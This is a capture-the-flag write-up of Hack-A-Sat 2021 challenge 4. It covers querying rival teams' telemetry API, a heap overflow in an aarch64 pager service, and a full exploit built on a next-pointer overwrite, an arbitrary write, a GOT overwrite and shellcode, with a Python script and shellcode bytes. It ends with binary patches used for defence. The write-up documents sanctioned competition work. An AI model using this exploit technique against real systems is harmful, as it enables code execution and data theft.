# HACK-A-SAT 2021: Challenge 4

Announcements from the staff:

> Challenge 4 RELEASE: DANX pager service is in the process of being deployed on the comm payload subsystems. Monitor here for the full release of challenge 4 and any updates over the next 15 minutes...
>
> Binaries for DANX pager service have been deployed to your cosmos machine home directories!
> DANX pager server on the comm payload subsystem has been started!
>
> If you send using the DANX flag via your user segment client binary, you can send packets to challenge 4

> Management has ordained deployment of a backwards-compatibility raw "Report API" server on each team's systems. Not quite sure what it does yet, but might be worth looking into as well! (IP 10.0.{TEAM}1.100, port 1337 tcp)

We assumed that both the binary and the Report API service would be useful for his challenge, so we started to investigate 
them in parallel.

## Management Report API

Sending garbage data to another team's Report API server gave us a very verbose error message:

```ruby
** invalid request ** Exception: ({
    'jsonrpc': '2.0',
    'method': 'tlm_formatted',
    'params': ['\n'],
    'id': 2
}, {
    'jsonrpc': '2.0',
    'id': 2,
    'error': {
        'code': -1,
        'message': "ERROR: Telemetry Item must be specified as 'TargetName PacketName ItemName' : \n",
        'data': {
            'class': 'RuntimeError',
            'message': "ERROR: Telemetry Item must be specified as 'TargetName PacketName ItemName' : \n",
            'backtrace': [
              "/var/lib/gems/2.5.0/gems/cosmos-4.5.1/lib/cosmos/script/extract.rb:97:in `extract_fields_from_tlm_text'", 
              "/var/lib/gems/2.5.0/gems/cosmos-4.5.1/lib/cosmos/tools/cmd_tlm_server/api.rb:1648:in `tlm_process_args'", 
              "/var/lib/gems/2.5.0/gems/cosmos-4.5.1/lib/cosmos/tools/cmd_tlm_server/api.rb:472:in `tlm_formatted'", 
              "/var/lib/gems/2.5.0/gems/cosmos-4.5.1/lib/cosmos/io/json_drb.rb:265:in `public_send'", 
              "/var/lib/gems/2.5.0/gems/cosmos-4.5.1/lib/cosmos/io/json_drb.rb:265:in `process_request'", 
              "/var/lib/gems/2.5.0/gems/cosmos-4.5.1/lib/cosmos/io/json_drb_rack.rb:79:in `handle_post'", 
              "/var/lib/gems/2.5.0/gems/cosmos-4.5.1/lib/cosmos/io/json_drb_rack.rb:61:in `call'", 
              "/var/lib/gems/2.5.0/gems/puma-3.12.6/lib/puma/configuration.rb:227:in `call'", 
              "/var/lib/gems/2.5.0/gems/puma-3.12.6/lib/puma/server.rb:706:in `handle_request'", 
              "/var/lib/gems/2.5.0/gems/puma-3.12.6/lib/puma/server.rb:476:in `process_client'", 
              "/var/lib/gems/2.5.0/gems/puma-3.12.6/lib/puma/server.rb:334:in `block in run'", 
              "/var/lib/gems/2.5.0/gems/puma-3.12.6/lib/puma/thread_pool.rb:135:in `block in spawn_thread'"
            ],
            'instance_variables': {}
        }
    }
})
```

In addition to the expected format being disclosed in the exception message \linebreak (`TargetName PacketName ItemName`), we 
learned that Cosmos is running on the other end. We already spent some time parsing this year's configuration files, so 
we could easily request values from other teams. For instance, the state of batteries or a field named `PING_STATUS` 
and changing at regular intervals:

```console
[team7@challenger7 ~]$ nc 10.0.11.100 1337
SLA_TLM HK_TLM_PKT PING_STATUS
0x2652022D6C8EAE1C
```

```console
[team7@challenger7 ~]$ nc 10.0.41.100 1337
EPS_MGR FSW_TLM_PKT BATTERY_VOLTAGE
11.480243682861328
```

The staff broadcasted a hint around 30 minutes after the initial challenge announcement:

> HINT: Telemetry for challenge 4 come out of the satellite via `SLA_TLM` telemetry

We quickly iterated over the metrics available under `SLA_TLM` thanks to the Cosmos configuration files we parsed 
earlier, but nothing looked promising at this stage except an item named `ATTRIBUTION_KEY`:

```python
[team7@challenger7 ~]$ python3 management_test.py
SLA_TLM HK_TLM_PKT CMD_VALID_COUNT: b'0\n'
SLA_TLM HK_TLM_PKT CMD_ERROR_COUNT: b'0\n'
SLA_TLM HK_TLM_PKT LAST_TBL_ACTION: b'0\n'
SLA_TLM HK_TLM_PKT LAST_TBL_STATUS: b'0\n'
SLA_TLM HK_TLM_PKT EXOBJ_EXEC_CNT: b'0\n'
SLA_TLM HK_TLM_PKT ATTRIBUTION_KEY: b'0x7F77BD1C33596ADD\n'
SLA_TLM HK_TLM_PKT ROUND: b'0x0\n'
SLA_TLM HK_TLM_PKT SEQUENCE: b'0x0\n'
SLA_TLM HK_TLM_PKT PING_STATUS: b'0x2A6F012812A5A1D5\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_1: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_2: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_3: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_4: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_5: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_6: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_7: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_8: b'0x0\n'
```

`ATTRIBUTION_KEY` especially caught our eye because of the arguments we could use with the previous binary:

```
Usage: User Segment Client [options]

Optional arguments:
[...]
-k --key                Attribution key [required]
```

Since we only knew our attribution key during challenge 3, we wondered what would happen if we used another  
team's attribution key along with the RSA keys we factored earlier. We dumped the 7 unknown `ATTRIBUTION_KEY` and
started invoking the user segment client with each pair. We reached out to the organizers to inform them of our progress 
but the discussion took a rather unexpected turn:

> Staff: Which team attribution key did you use?

> Solar Wine: all of them

> Staff: By using the attribution key from other teams on challenge 3, you grant points to other teams. We use the attribution keys to award points to the source team. Unless you are feeling charitable, only use your own attribution key!

Oops! We all agreed that being charitable for a few ticks was enough, and stopped the script. As the reversers 
progressed on the pager binary, we understood that the only way to exfiltrate the DANX flag would be to write it to an 
existing socket and dump it from `COMM_TELEM_7` (7 being our team identifier).

We also monitored the status of `COMM_TELEM_{1-8}` on every Report API to identify the teams making progress on this 
challenge, like team 4 and team 5 who already automated the communication with the DANX service after a few hours. 
For instance, here is a capture of team 6's telemetry showing their progress; the values `0x434F4D4D49535550` and 
`0x504b542d36313631` are respectively `COMMISUP` and `PKT-6161`, values sent by the DANX service upon a successful 
communication:

```
SLA_TLM HK_TLM_PKT COMM_TELEM_1: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_2: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_3: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_4: b'0x434F4D4D49535550\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_5: b'0x504b542d36313631\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_6: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_7: b'0x0\n'
SLA_TLM HK_TLM_PKT COMM_TELEM_8: b'0x0\n'
```

## DANX pager service

The new service ``DANX pager`` is reachable using the challenge 3 client binary with the command line option ``--danx-service``. Communication with the challenge binary is one-way only and the packets can be sent to any satellite using the previously retrieved RSA keys.

The service is a stripped **aarch64** binary receiving commands on the standard input (file descriptor 0) and sending telemetry to client connected on TCP port 4580. The challenge binary requires a ``FLAG`` environment variable to start.

So, the goal of this challenge is to exploit a vulnerability in the binary to retrieve the ``FLAG`` value and extract it using telemetry.

The challenge archive given in our Cosmos machine home directory contained the challenge binary and the required libs to run and debug the challenge locally using ``qemu-aarch64`` and ``gdb-multiarch``.

### Analysis

The challenge binary performs the following steps:

1. Listen on TCP port 4580 and wait for the ``telemetry dispatcher`` to connect
2. Allocate a ``RWX`` (read, write, and execute) page at ``0x800000``
3. Read the ``FLAG`` environment variable and copy the value to the ``RWX`` page (8 bytes).
4. Signal to telemetry client ``COMREADY``
5. Infinite loop:
   1. Receive a packet from the standard input
   2. Exit if the packet starts with ``KILL``
   3. Parse the packet (custom binary format) and signal to telemetry client ``PKT-xx-xx``

The custom packet structure is :

```c
struct packet
{
    uint8_t id;
    uint8_t subid;
    uint8_t size;
    char content[1]; /* content size == size */
};
```

The packet received is stored in global lists, one doubly linked list for each packets with the same ``id`` and one of fixed size used as a LRU (least recent used ``id`` list is freed).

The doubly linked list has the following structure:

```c
struct packet_entry
{
    struct packet_entry * next;
    struct packet_entry * prev;
    uint8_t id;
    uint8_t subid;
    uint8_t size;
    char content[1]; /* content size == size */
};
```

### Vulnerability: Heap overflow

When the challenge receives a packet with a ``id`` and ``subid`` already present in the doubly linked list, the new packet replaces the old one but the size is not properly checked.

```c
void replace_entry(struct packet_entry * entry, struct packet * recv)
{
  if ( recv->size <= (entry->size + 3) ) /* Size checked against size + 3 */
  {
    entry->size = recv->size;
    memcpy(&entry->content, &recv->content, entry->size); /* Heap overflow */
  }
}
```

The ``size`` field is validated against the ``previous size + 3`` then the new ``size`` is stored so the *memcpy* may trigger a heap overflow. 

Also, by repeating this behavior, the size of the overflow can be increased (+3 each time) since the new size is stored in ``entry->size`` each time.

### Exploitation

Using our debugging setup, we crafted two adjacent heap allocations of type ``struct packet_entry`` with the same ``id`` and computed the offset between the chunk ``#0`` content and the chunk ``#1`` next pointer:

|  Heap chunk ``#0`` | Heap chunk ``#1`` |
|:------------------:|:-----------------:|
| next:    ``#1``    | next:    0        |
| prev:    0         | prev:    0        |
| id:      0         | id:      0        |
| subid:   16        | subid:   32       |
| content: XXXXX     | content: A        |

By triggering the vulnerability multiple times on chunk ``#0``, the overflow will reach and overwrite ``#1`` next pointer with controlled content:

|  Heap chunk ``#0`` | Heap chunk ``#1`` |
|:------------------:|:-----------------:|
| next:    ``#1``    | next:    XXXXXXXX |
| prev:    0         | prev:    0        |
| id:      0         | id:      0        |
| subid:   16        | subid:   32       |
| content: XXXXXXXXXX| content: A        |

We can achieve arbitrary write using the ``replace_entry`` feature if we corrupt the ``next`` pointer with a controlled address and if we know the ``subid`` field value \linebreak at ``controlled address + offsetof(packet_entry, subid)``.

Thankfully, the challenge binary lacks of *PIE* and *Full RELRO* mitigations, so the exploitation plan is:

* Trigger arbitrary write on ``RWX`` page to write a small shellcode
* Trigger arbitrary write on binary ``got.plt`` to overwrite sprintf address with our shellcode address
* Shellcode should write the flag to telemetry and loop indefinitely (to prevent crash)

Notes:

* The ``RWX`` page after the 8 bytes of the flag is all zeros so we know the ``subid`` and we can increase the ``size`` thanks to the vulnerability (+3 on each write) and write a 24 bytes shellcode.
* The ``got.plt`` entry of ``perror`` is not initialized thus it points to the ``.plt`` segment, so we know the value of ``subid`` and we can overwrite ``sprintf`` address with our shellcode address.
* The shellcode is shown below and it writes the flag in cleartext in the telemetry socket:

```asm
eor  x0, x0, x0
movk x0, #0x80, lsl #16  ; set x0 to 0x800000 (RWX page address containing the flag)
movz x1, #0x118c
movk x1, #0x40, lsl #16  ; set x1 to gadget write_to_telemetry(char text[8])
blr  x1                  ; call write_to_telemetry(@FLAG)
loop: b loop             ; infinite loop to prevent telemetry overwrite
```

The exploit and flag submission were automated later to run each tick against all the teams (as a new tick would generate a new flag and restart the service).

### Exploit code

```python
#!/usr/bin/env python3
import datetime
import sys
import socket
import struct
import subprocess
import time
import binascii
import os
import json

def p64(i):
    """p64(i) -> str
    Pack 64 bits integer (little endian)
    """
    return struct.pack('<Q', i)

TEAM_ID = int(sys.argv[1])
HOST = '10.0.{}1.100'.format(TEAM_ID)
PORT = 1337

cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cli.connect((HOST, PORT))

def wait_recv(client):
    client.send(b'SLA_TLM LATEST COMM_TELEM_7\n')
    return client.recv(100)
```

```python
def p(_, id, id2, content):
    global cli
    print("Sending command {:x} {:x}".format(id, id2))
    filename = f"/home/team7/team_7/client/packet_tmp_PWN_{time.time()}"
    f = open(filename, 'wb')
    f.write(bytes([id]))
    f.write(bytes([id2]))
    f.write(bytes([len(content)]))
    f.write(content)
    # f.write(b"\x00" * (0x400 - len(content) - 3))
    f.close()
    output = b'RATE_LIMIT'
    while b'RATE_LIMIT' in output:
        time.sleep(1)
        output = subprocess.check_output(f'/home/team7/team_7/client/client -k 5647008472405673096 -f /home/team7/team_7/other_teams_keys/team_{TEAM_ID}_rsa_priv.pem -d {filename} -p 31337 -a 10.0.0.101 -i {TEAM_ID} -s', shell=True, cwd = '/home/team7/team_7/client/')
        print("[SB] Received {}".format(output))


    os.remove(filename)

def do_pwn():
    f = None
    # Prepare two packet_entry in the heap
    p(f, 0, 0x10, b"X" * 5)
    p(f, 1, 0x20, b"A")

    # Vulnerability to grow the size to reach offset of next field = 0x20 - 0x13
    p(f, 0, 0x10, b"X" * 8)
    p(f, 0, 0x10, b"X" * 11)
    p(f, 0, 0x10, b"X" * 14)
    p(f, 0, 0x10, b"X" * 17)


    # RWX page address
    shellcode_addr = 0x800000
    # Got PLT address of perror
    got_addr = 0x412010 - 0x10

    # Corrupt next pointer to allow arb write to RWX page
    p(f, 0, 0x10, b"X" * 13 + (p64(shellcode_addr + 0x10)[:7]))
    # shellcode page full of nullbytes so subid is 0
    #shellcode_data  = b"\x00\x10\xa0\xd2\x81\x31\x82\xd2\x01\x08\xa0\xf2\x20\x00\x3f\xd6\x01\x00\x00\x14" # mov x0, 0x800000; movz x1, #0x118c; movk x1, #0x40, lsl #16; blr x1; b #0x14;
    shellcode_data = b"\x00\x10\xa0\xd2\x81\x31\x82\xd2\x01\x08\xa0\xf2\x20\x00\x3f\xd6\x00\x00\x20\xd4"
    # Use vulnerability to increase size
    for i in range(1,(len(shellcode_data)//3)+1):
        p(f, 0x01, 0, b"\xcc" * (3*i))
    # Then write full shellcode
    p(f, 0x01, 0, b'\xcc' + shellcode_data)

    # Corrupt next pointer to allow arb write to GOT PLT page
    p(f, 0, 0x10, b"X" * 13 + p64(got_addr))
    # Write our shellcode address to GOT entry of sprintf (called at the end of message processing, no need to send another message to trigger RCE)
    p(f, 0x01, 0x09, b'\xcc' * 0x15 + p64(shellcode_addr + 0x10 + 0x13 + 1))

do_pwn()
```

## Defending against other teams

Our satellite gained a new module in the C&DH: `SLA_TLM`.
We downloaded `/cf/sla_tlm.so` and analyzed it.
This module was very simple:

- Function `InitApp` subscribed to several message identifiers on the internal software bus.
- Function `ProcessCommands` processed the received messages and updated a global structure `Sla_tlm` with information they contained.
- Function `SLA_TLM_SendHousekeepingPkt` copied some fields of `Sla_tlm` to a housekeeping packet which was then sent to the ground station.

The other teams were able to get our flag by making our COMM system send a `COMM_PAYLOAD_TELEMETRY` packet to the C&DH.
Our `SLA_TLM` module then copied some fields of this packet to a housekeeping packet defined in C as:

```c
struct SLA_TLM_HkPkt {
    uint8 Header[12];
    uint16 ValidCmdCnt;
    uint16 InvalidCmdCnt;
    uint8 LastAction;
    uint8 LastActionStatus;
    uint16 ExObjExecCnt;
    uint64 Key;
    uint8 RoundNum;
    uint16 SequenceNum;
    uint64 PingStatus;
    uint64 CommTelemField1; // Field used by team 1
    uint64 CommTelemField2; // Field used by team 2
    uint64 CommTelemField3; // Field used by team 3
    uint64 CommTelemField4; // Field used by team 4
    uint64 CommTelemField5; // Field used by team 5
    uint64 CommTelemField6; // Field used by team 6
    uint64 CommTelemField7; // Field used by team 7
    uint64 CommTelemField8; // Field used by team 8
};
```

How could we prevent the other teams from capturing our flag?
We were a little bit creative and patched `ProcessCommands` to make the `SLA_TLM` module no longer update the fields when a `COMM_PAYLOAD_TELEMETRY` packet was received.

For example we modified the instruction

```text
00011388 c4 38 60 d8     std        g2,[g1+0xd8]=>Sla_tlm.CommTelemField1
```

with a `nop` which did not do anything.
This was easy to do in our scapy shell:

```python
nop = bytes.fromhex("01000000")
mem_write32_from_symbol_cdh("SLA_TLM_AppMain", 0x00011388 - 0x10000, nop)
mem_write32_from_symbol_cdh("SLA_TLM_AppMain", 0x00011410 - 0x10000, nop)
# ...
```

Moreover to force all fields `CommTelemField1`, `CommTelemField2`... to zero, another batch of commands was sent:

```python
# "uint64 CommTelemField1" at offset 0xd8 of struct SLA_TLM_Class
mem_write32_from_symbol_cdh("Sla_tlm", 0xd8, bytes.fromhex("00000000"))
mem_write32_from_symbol_cdh("Sla_tlm", 0xdc, bytes.fromhex("00000000"))
# "uint64 CommTelemField2" at offset 0xe0 of struct SLA_TLM_Class
mem_write32_from_symbol_cdh("Sla_tlm", 0xe0, bytes.fromhex("00000000"))
mem_write32_from_symbol_cdh("Sla_tlm", 0xe4, bytes.fromhex("00000000"))
```

This hack was very stable and did not seem to make us lose any point.
